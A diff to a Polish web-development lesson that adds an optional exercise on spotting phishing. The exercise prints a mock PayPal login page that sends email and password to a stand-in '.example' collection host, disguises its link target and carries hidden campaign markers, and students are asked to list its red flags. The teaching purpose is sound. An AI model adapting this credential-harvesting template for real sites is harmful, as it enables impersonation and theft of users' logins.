@@ -120,6 +120,54 @@ Sprawdź przed oddaniem: tabela ma nagłówki `th` i tytuł `caption`; radio poz
 3. Napraw znalezione problemy (np. link „czytaj dalej" - czy poza kontekstem wiadomo, dokąd prowadzi?).
 4. **Dla bohaterów:** dodaj na samej górze strony link „Przejdź do treści" prowadzący do `main` (`id="tresc"`) - pierwszy prawdziwy trik dostępności, zanim w ogóle poznasz ARIA.
 
+## Bonus ⭐ - detektyw phishingu (wstęp do cyberbezpieczeństwa)
+
+Phishing to mail albo strona, która udaje bank albo portal, żeby wyłudzić login i hasło. Technicznie to zwykły, porządnie zrobiony HTML - więc wszystko, czego dziś się nauczyłeś/aś (linki, domeny, formularze, widok źródła), wystarczy, żeby go rozbroić. Bonus jest dobrowolny, nie podlega ocenie i nie wchodzi do kartkówki.
+
+**Zadanie:** poniższy kod to fałszywa strona „od PayPala" (spokojnie - to dydaktyczna makieta; końcówka `.example` jest zarezerwowana do przykładów i domena nigdzie nie prowadzi). Znajdź **minimum 5 z 8 czerwonych flag**. Klucz ma prowadzący - porównacie na końcu zajęć.
+
+Wklej kod do pliku `phishing-demo/index.html` w swoim projekcie:
+
+```html
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8">
+  <title>PayPal - pilne potwierdzenie konta</title>
+  <!-- v3: poprzednia domena zablokowana, ta powinna wytrzymac dluzej -->
+</head>
+<body>
+  <h1>Twoje konto zostanie zablokowane!</h1>
+
+  <p>Drogi Kliencie, wykryliśmy nieautoryzowaną aktywność na Twoim koncie.
+     Masz <strong>24 godziny</strong> na potwierdzenie danych - po tym czasie
+     konto zostanie trwale usunięte.</p>
+
+  <p><a href="http://paypa1-bezpieczne-logowanie.example/potwierdz">
+    https://www.paypal.com/logowanie</a></p>
+
+  <p>albo potwierdź dane poniżej:</p>
+
+  <form action="http://paypa1-bezpieczne-logowanie.example/zbierz" method="get">
+    <input type="hidden" name="kampania" value="v3-energia">
+    <label for="login">Adres e-mail:</label>
+    <input type="email" name="login" id="login">
+    <label for="haslo">Hasło:</label>
+    <input type="password" name="haslo" id="haslo">
+    <button>Potwierdź konto</button>
+  </form>
+
+  <p>&copy; 2026 PayPal Inc. Wszystkie prawa zastrzeżone.</p>
+</body>
+</html>
+```
+
+1. **Najpierw samo źródło** - przeczytaj kod i wypisz wszystko, co budzi Twoją czujność. Podpowiedź: atakujący zostawia ślady tam, gdzie użytkownik nie patrzy - w `href` (a nie w tekście linku!), w atrybutach formularza i w komentarzu HTML (`<!-- ... -->` - widać go tylko w źródle).
+2. **Potem podgląd** - otwórz makietę w Live Server. Wygląda prawie wiarygodnie? To jest właśnie lekcja: sam HTML potrafi udawać cokolwiek, a różnica między stroną prawdziwą a fałszywą kryje się w szczegółach, których nie widać.
+3. **Eksperyment GET vs POST** na własnym fanpage'u: wyślij formularz zapisu i popatrz na pasek adresu. Jeśli Twoje imię i e-mail pojawiły się tam jawnym tekstem - formularz używał domyślnej metody `get`. Dodaj do `form` atrybut `method="post"`, wyślij ponownie i porównaj: dane zniknęły z adresu. Dlatego loginy i hasła zawsze jadą `post`-em - a formularz phishera zbierający hasło metodą `get` to podwójna wpadka.
+
+Zasada na całe życie z tego bonusu: **adres sprawdzasz po najechaniu na link (podgląd `href` w rogu przeglądarki), nie po tekście linku** - a hasła nie wpisujesz nigdzie, gdzie trafiłeś/aś, klikając z maila.
+
 ## Checklista dostępności (a11y) - samokontrola fanpage'a
 
 Przejdź przed oddaniem; to samo będzie na liście kontrolnej arkusza praktycznego:
